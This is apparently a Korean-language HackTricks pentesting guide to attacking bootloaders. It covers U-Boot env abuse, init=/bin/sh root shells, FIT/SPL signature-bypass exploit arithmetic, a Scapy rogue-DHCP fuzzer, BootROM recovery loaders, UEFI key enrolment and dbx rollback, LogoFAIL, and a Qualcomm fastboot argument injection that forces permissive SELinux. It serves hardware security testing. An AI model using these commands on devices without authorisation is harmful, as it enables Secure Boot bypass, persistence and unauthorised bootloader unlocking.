# 부트로더 테스트

{{#include ../../banners/hacktricks-training.md}}

장치 시작 구성을 수정하고 U-Boot 및 UEFI급 로더와 같은 부트로더를 테스트할 때는 다음 단계를 권장합니다. 초기 코드 실행을 확보하고, 서명 및 롤백 보호를 평가하며, 복구 또는 네트워크 부팅 경로를 악용하는 데 집중하세요.

관련 항목: bl2_ext 패치를 통한 MediaTek secure-boot 우회:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 빠른 공략 및 환경 악용

1. 인터프리터 셸에 접근
   - 부팅 중 `bootcmd`가 실행되기 전에 알려진 중단 키(흔히 아무 키나, 0, 스페이스 또는 보드별 "매직" 시퀀스)를 눌러 U-Boot 프롬프트를 표시합니다.<sup>[[1]](#references)</sup>

2. 부팅 상태 및 변수 확인
   - 유용한 명령:
     - `printenv` (환경 변수 출력)
     - `bdinfo` (보드 정보, 메모리 주소)
     - `help bootm; help booti; help bootz` (지원되는 커널 부팅 방식)
     - `help ext4load; help fatload; help tftpboot` (사용 가능한 로더)

3. root 셸을 얻도록 부팅 인수 수정
   - `init=/bin/sh`를 추가해 커널이 일반 init 대신 셸을 실행하게 합니다:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. TFTP 서버에서 Netboot
   - 네트워크를 구성하고 LAN에서 커널/FIT 이미지를 가져오기:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. 환경 변수를 통해 변경 사항 지속
   - env 저장소가 쓰기 방지되어 있지 않다면 제어 권한을 지속할 수 있습니다:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`와 같이 fallback 경로에 영향을 주는 변수를 확인합니다. 잘못 설정된 값은 shell에 반복적으로 진입할 수 있게 할 수 있습니다.

6. 디버그/안전하지 않은 기능 확인
   - 다음을 살펴봅니다: `bootdelay` > 0, `autoboot` 비활성화, 제한 없는 `usb start; fatload usb 0:1 ...`, serial을 통한 `loady`/`loads` 사용 가능 여부, 신뢰할 수 없는 미디어에서 `env import`, 서명 확인 없이 로드되는 커널/ramdisk.

7. U-Boot 이미지/검증 테스트
   - 플랫폼에서 FIT 이미지를 사용한 secure/verified boot를 지원한다고 주장하는 경우, 서명되지 않은 이미지와 변조된 이미지를 모두 테스트합니다:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 레거시 `verify=n` 동작을 사용하면 임의의 payload를 부팅할 수 있는 경우가 많습니다.
   - 단순히 허용/거부 결과만 확인하고 끝내지 마세요. 최근 FIT 연구에 따르면 검증 경로 자체가 사전 인증 공격 표면이 될 수 있습니다. 외부에 저장된 FIT 데이터(`data-offset`, `data-position`, `data-size`), 서명된 구성 선택, `loadables`, overlay / `extra-conf` 처리를 대상으로 negative test를 수행하세요.
   - 일치하는 소스 트리가 있다면, 실제 하드웨어를 건드리기 전에 `test/vboot/vboot_test.sh`를 사용해 U-Boot sandbox에서 FIT 검증 동작을 빠르게 재현할 수 있습니다.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, 및 스크립트 bootflow
   - 최신 U-Boot 빌드에서 `bootcmd`는 흔히 Standard Boot를 감싸는 wrapper일 뿐입니다. 즉, 화면에 보이는 환경이 무해해 보여도 쓰기 가능한 미디어, PXE 또는 SPI flash가 실제 신뢰 경계가 될 수 있습니다.
   - `extlinux` bootmeth는 `/` 및 `/boot` 아래에서 `extlinux/extlinux.conf`를 검색합니다. 스크립트 bootmeth는 먼저 `boot.scr.uimg`를 검색한 다음 `boot.scr`을 검색합니다. 네트워크 부팅에서는 스크립트 파일 이름이 `boot_script_dhcp`에서 지정될 수 있습니다.
   - 유용한 초기 분류 명령:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - 테스트할 abuse case: `boot_targets`에서 앞쪽에 위치한 공격자 제어 USB/SD 미디어, 쓰기 가능한 `/boot/extlinux/extlinux.conf`, `boot.scr`을 제공하는 rogue TFTP, 또는 `script_offset_f`를 통한 SPI 기반 스크립트 실행.
   - 플랫폼이 FIT verification에 의존한다면, 이미지별로만 서명하지 말고 configuration 수준에서 configuration에 서명해야 합니다. `required-mode=all`은 필수 키 중 하나만 허용하는 것보다 강력합니다.

### SPL에서 검증 전에 복사되는 외부 FIT 데이터

SPL FIT 로딩에서는 configuration 서명이 온전하더라도 외부 payload metadata가 안전해지는 것은 아닙니다. U-Boot는 `data-position`, `data-offset`, `data-size`를 서명된 configuration 속성에서 제외합니다. 영향을 받는 `load_simple_fit()` 경로에서는 SPL이 이 필드들에서 소스 오프셋과 복사 길이를 계산한 다음, 이미지 hash를 확인하기 **전에** `info->read()`를 호출합니다. 따라서 쓰기 가능한 boot media에 조작된 FIT를 두면 서명을 위조하지 않고도 RAM을 덮어쓸 수 있습니다. 일반적으로 서명된 `load` 속성이 destination을 고정하므로, 먼저 지나치게 큰 복사로 해당 주소에서 stack이나 다른 control data에 도달할 수 있는지 확인하세요.<sup>[[15]](#references)[[16]](#references)</sup>

flash read라고 가정하지 말고 실제 board loader와 memory map을 추적하세요. 시연된 RAM loader는 `spl_ram_load_read()`와 `memcpy()`에 도달했습니다. 호출 지점에서 `fit_offset`과 reader가 더하는 FIT base address, loader의 block length(`spl_get_bl_len(info)`), fork별 alignment, 그 결과로 나온 `read_offset`과 전송 `size`, destination `src_ptr`, 저장된 return address의 위치를 기록하세요. 연속된 mapped source region이 필요한 복사 거리를 포함하는지, destination과 겹치는지, source 위치의 바이트로 공격자가 제어하는 FIT data 안의 pointer를 지정할 수 있는지 확인하세요. 전체 pointer가 loader의 alignment 제약을 만족할 수 없다면 일반적인 [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/)을 적용할 수 있습니다.<sup>[[16]](#references)</sup>

연구진의 32-bit AST2600 테스트 빌드에서 `src_ptr`은 `0x80001000`이었고 `memcpy`의 저장된 return address는 `0x902ffe24`에 있었습니다. 이들은 OpenBMC의 stack placement 및 alignment helper를 적용해 수정한 upstream build를 사용했습니다. RAM reader는 `0x10000` FIT base를 더했고, helper는 source offset을 `ARCH_DMA_MINALIGN`(64 bytes) 경계로 내림했습니다. `0x902fffe4`에 유용한 little-endian pointer를 두고 한 바이트 덜 복사하면, 알려진 상위 0 byte를 보존하면서 저장된 return address의 하위 3 bytes만 변경할 수 있었습니다. 반면 upstream RAM loader는 block length로 1 byte를 사용하므로, 이 64-byte alignment 및 부분 덮어쓰기 우회 방법은 일반적인 SPL 요구 사항이 아닙니다. 각 빌드에서 주소, loader block length, 복사 범위를 다시 계산하세요. 아래의 원래 계산에서 `fit_offset`은 `load_simple_fit()`에 전달된 인수가 아니라 RAM reader가 더하는 실질적인 FIT base를 가리킵니다.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

업스트림 수정 사항은 `info->read()`를 호출하기 전에 raw `data-size`와 **블록 경계에 맞춘** 전송 크기 모두에 상한을 적용합니다. overlay 경로는 실제 버퍼 용량을 전달하지만, 다른 호출자는 `CONFIG_SYS_BOOTM_LEN`을 사용합니다. 이는 여유 메모리가 그만큼 있다는 증명이 아니라 느슨한 상한일 뿐입니다. vendor fork를 평가할 때는 해당 검사가 있는지 확인하고, 허용된 복사 범위를 보드의 실제 SPL 스택 및 예약 영역과 비교하세요.<sup>[[15]](#references)[[16]](#references)</sup>

## 네트워크 부팅 공격 표면 (DHCP/PXE) 및 rogue 서버

9. PXE/DHCP 매개변수 fuzzing
   - U-Boot의 레거시 BOOTP/DHCP 처리에는 메모리 안전성 문제가 있었습니다. 예를 들어 CVE‑2024‑42040은 조작된 DHCP 응답을 통해 메모리 정보가 노출되어 U-Boot 메모리의 바이트가 네트워크로 유출될 수 있다고 설명합니다.<sup>[[4]](#references)</sup> DHCP/PXE 코드 경로에 지나치게 길거나 엣지 케이스에 해당하는 값(옵션 67 bootfile-name, vendor 옵션, file/servername 필드)을 입력하고 멈춤이나 leak이 발생하는지 관찰하세요.
   - netboot 중 부팅 매개변수에 부하를 주는 최소 Scapy 스니펫:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - 또한 PXE filename 필드가 OS 측 프로비저닝 스크립트와 연결될 때, 정화되지 않은 상태로 셸/loader 로직에 전달되는지도 검증합니다.

10. Rogue DHCP server command injection 테스트
   - Rogue DHCP/PXE 서비스를 설정하고 filename 또는 options 필드에 문자를 삽입해 부팅 체인의 후속 단계에서 명령 인터프리터에 도달할 수 있는지 시도합니다. Metasploit의 DHCP auxiliary, `dnsmasq` 또는 사용자 지정 Scapy 스크립트를 사용하면 좋습니다. 먼저 실험실 네트워크를 격리해야 합니다.

## 일반 부팅을 재정의하는 SoC ROM 복구 모드

많은 SoC는 플래시 이미지가 유효하지 않은 경우에도 USB/UART를 통해 코드를 수신하는 BootROM "loader" 모드를 제공합니다. Secure Boot 퓨즈가 설정되지 않았다면 부팅 체인의 매우 초기 단계에서 임의 코드 실행이 가능할 수 있습니다.

- NXP i.MX (Serial Download Mode)
  - 도구: `uuu` (mfgtools3) 또는 `imx-usb-loader`.
  - 예: `imx-usb-loader u-boot.imx`로 사용자 지정 U-Boot를 RAM에 전송해 실행합니다.
- Allwinner (FEL)
  - 도구: `sunxi-fel`.
  - 예: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - 도구: `rkdeveloptool`.
  - 예: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`으로 loader를 스테이징하고 사용자 지정 U-Boot를 업로드합니다.

기기에 Secure Boot eFuses/OTP가 설정되어 있는지 확인합니다. 설정되어 있지 않으면 BootROM 다운로드 모드는 SRAM/DRAM에서 첫 번째 단계의 페이로드를 직접 실행하여 상위 수준의 모든 검증(U-Boot, 커널, rootfs)을 우회하는 경우가 많습니다.

## UEFI/PC급 bootloader: 빠른 점검

11. ESP 변조, 롤백 및 키 등록 테스트
   - EFI System Partition (ESP)을 마운트하고 loader 구성 요소를 확인합니다: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo 경로.
   - 가능하면 OS에서 Secure Boot 상태와 키 데이터베이스를 덤프합니다:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - 플랫폼이 Setup Mode 상태이거나, 인증 없이 키 등록을 허용하거나, 테스트용/기본 Platform Key를 탑재한 경우(PKfail 유형), 로컬 관리자나 물리적 접근 권한이 있는 공격자는 자신의 KEK/db를 등록해 Secure Boot가 “enabled”인 것처럼 보이게 유지하면서 임의의 EFI 바이너리를 부팅할 수 있습니다.<sup>[[3]](#references)</sup>
   - Secure Boot 해지 목록(dbx)이 최신 상태가 아니라면 다운그레이드된 부팅 구성 요소나 취약점이 알려진 서명된 부팅 구성 요소로 부팅을 시도하세요. 플랫폼이 여전히 오래된 shim/bootmanager를 신뢰한다면, ESP에서 자신의 커널이나 `grub.cfg`를 로드해 지속성을 확보할 수 있는 경우가 많습니다.
   - Windows에서는 펌웨어 `dbx`에 `Microsoft Windows Production PCA 2011` 서명자가 없는 경우, 패치된 호스트도 취약한 서명된 boot manager를 받아들일 수 있습니다. 이는 BlackX에서 관찰되었습니다.<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop 방식의 우회로 공격자의 MOK를 등록할 수 있으며, 이후 정상적인 shim이 해당 키로 서명된 EFI 페이로드를 로드할 수 있습니다.<sup>[[12]](#references)[[13]](#references)</sup> 나중에 이전 Windows 서명자를 해지하더라도 등록된 MOK는 제거되지 않으므로, 해당 shim이 계속 신뢰되는 경우 shim 기반 경로가 지속될 수 있습니다.<sup>[[12]](#references)</sup>
   - 승인된 UEFI 머신에서 이 롤백 경로를 테스트하기 전에 Windows 업데이트 기록만 확인하지 말고 **펌웨어의 실제 해지 상태**를 확인하세요.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft는 `dbx`의 2011 서명자를 확인하는 읽기 전용 관리자 권한 PowerShell 명령을 제공합니다.<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False`는 단서일 뿐입니다. 복구 가능한 lab에서 서명된 특정 boot component와 다른 revocation을 확인하세요.<sup>[[12]](#references)[[14]](#references)</sup> 보류 중인 registry update나 만료된 signing certificate는 완료된 `dbx` revocation과 같지 않습니다.<sup>[[13]](#references)[[14]](#references)</sup>

12. 오래된 shim / SBAT / dbx revocation 테스트
   - 오래된 Microsoft 서명 shim과 vendor fork는 revocation이 오래된 상태라면 여전히 BYOVD 방식의 bootkit 경로로 작동할 수 있습니다. 격리된 lab에서 과거에 취약했던 shim을 ESP에 놓고 자체 `grubx64.efi` 또는 kernel로 chainload를 시도하세요.<sup>[[11]](#references)</sup>
   - 빠른 초기 분류:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - shim이 revocation list에 있는데도 실행된다면, firmware/OS의 `dbx` 업데이트가 오래되었거나 upstream SBAT 보호 기능을 물려받지 않은 forked loader를 신뢰하는 것입니다.

13. Boot logo parsing bugs (LogoFAIL class)
   - 여러 OEM/IBV firmware가 boot logo를 처리하는 DXE의 이미지 파싱 취약점에 노출되었습니다. 공격자가 vendor-specific 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 ESP에 넣고 재부팅할 수 있다면, Secure Boot가 활성화되어 있어도 초기 부팅 중 코드 실행이 가능할 수 있습니다. 플랫폼이 사용자가 제공한 logo를 허용하는지, 그리고 해당 경로에 OS에서 쓸 수 있는지 테스트하세요.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Qualcomm의 ABL을 사용해 **Generic Bootloader Library (GBL)**를 로드하는 Android 16 기기에서는, ABL이 `efisp` 파티션에서 로드하는 UEFI 앱을 **인증**하는지 검증하세요. ABL이 UEFI 앱의 **존재 여부**만 확인하고 서명을 검증하지 않는다면, `efisp`에 대한 write primitive를 통해 부팅 시 **OS 이전의 서명되지 않은 코드 실행**이 가능해집니다.<sup>[[6]](#references)[[7]](#references)</sup>

실용적인 점검 항목과 악용 경로:

- **efisp write primitive**: `efisp`에 커스텀 UEFI 앱을 쓸 방법이 필요합니다(root/privileged service, OEM 앱 버그, recovery/fastboot 경로). 이 방법이 없으면 GBL 로딩 취약점에 직접 접근할 수 없습니다.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): 일부 빌드는 `fastboot oem set-gpu-preemption`의 추가 토큰을 받아 kernel cmdline에 덧붙입니다. 이를 이용해 permissive SELinux를 강제하여 보호된 파티션에 쓸 수 있습니다:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  장치에 패치가 적용된 경우, 이 명령은 추가 인수를 거부해야 합니다.<sup>[[5]](#references)[[6]](#references)</sup>
- **영구 플래그를 통한 Bootloader 잠금 해제**: 부팅 단계의 payload는 영구 잠금 해제 플래그(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 변경해 OEM 서버/승인 절차 없이 `fastboot oem unlock`을 모방할 수 있습니다. 다음 재부팅 후에도 이 상태 변경은 유지됩니다.<sup>[[6]](#references)</sup>

방어/초기 분석 참고 사항:

- ABL이 `efisp`에서 가져온 GBL/UEFI payload의 서명을 검증하는지 확인하세요. 검증하지 않는다면 `efisp`를 위험도가 높은 persistence 공격 표면으로 간주하세요.
- ABL fastboot OEM 핸들러에 **인수 개수를 검증**하고 추가 토큰을 거부하도록 패치가 적용됐는지 확인하세요.<sup>[[8]](#references)[[9]](#references)</sup>

## 하드웨어 주의 사항

초기 부팅 중 SPI/NAND flash와 상호작용할 때(예: 읽기를 우회하기 위해 핀을 접지하는 경우) 주의하고, 항상 flash 데이터시트를 확인하세요. 타이밍이 맞지 않는 단락은 장치나 프로그래머를 손상시킬 수 있습니다.

## 참고 사항 및 추가 팁

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용해 환경 blob을 RAM과 저장소 간에 이동해 보세요. 일부 플랫폼에서는 인증 없이 이동식 미디어에서 env를 가져올 수 있습니다.
- `extlinux.conf`를 통해 부팅하는 Linux 기반 시스템에서 persistence를 확보하려면, 서명 검사가 적용되지 않는 경우 부팅 파티션의 `APPEND` 행을 수정해(`init=/bin/sh` 또는 `rd.break`를 주입) 충분한 경우가 많습니다.
- 대상이 듀얼 슬롯/A/B 업데이트를 사용하는 경우, bootloader 자체 외부의 updater 전용 신뢰 공백도 놓치지 않도록 [펌웨어 분석 개요](README.md)에서 anti-rollback 및 슬롯 불일치 기법을 살펴보세요.
- 사용자 공간에서 `fw_printenv/fw_setenv`를 제공하는 경우, `/etc/fw_env.config`가 실제 env 저장소와 일치하는지 확인하세요. 잘못된 오프셋 설정으로 인해 엉뚱한 MTD 영역을 읽거나 쓸 수 있습니다.

## References

- [1] [펌웨어 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL 발견: 시스템 부팅 중 이미지 파싱의 위험성](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: 신뢰할 수 없는 플랫폼 키가 UEFI 생태계의 Secure Boot를 약화시킴](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 상세 정보](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: 검증되지 않은 두 문자열을 통한 Xiaomi 잠금 해제](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit으로 공격자가 bootloader 잠금 해제 가능](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) 아키텍처](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: 신뢰할 수 없는 입력이 kernel cmdline으로 전파되는 문제 수정](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value 명령 검사 추가](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [부팅 불가 상태: U-Boot의 FIT 서명 검증 무력화](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [취약점 안내 VU#616257 - Microsoft 서명 UEFI shim bootloader가 Secure Boot 우회에 취약](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: 사실로 확인된 신화](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus와 유사한 UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot 변경을 위한 Windows Boot Manager 취소 항목 관리 방법](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [U-Boot 패치: 외부 데이터 크기를 제한한 후 읽기](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [숨겨진 beneFIT: U-Boot SPL에서 서명 검증 우회](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
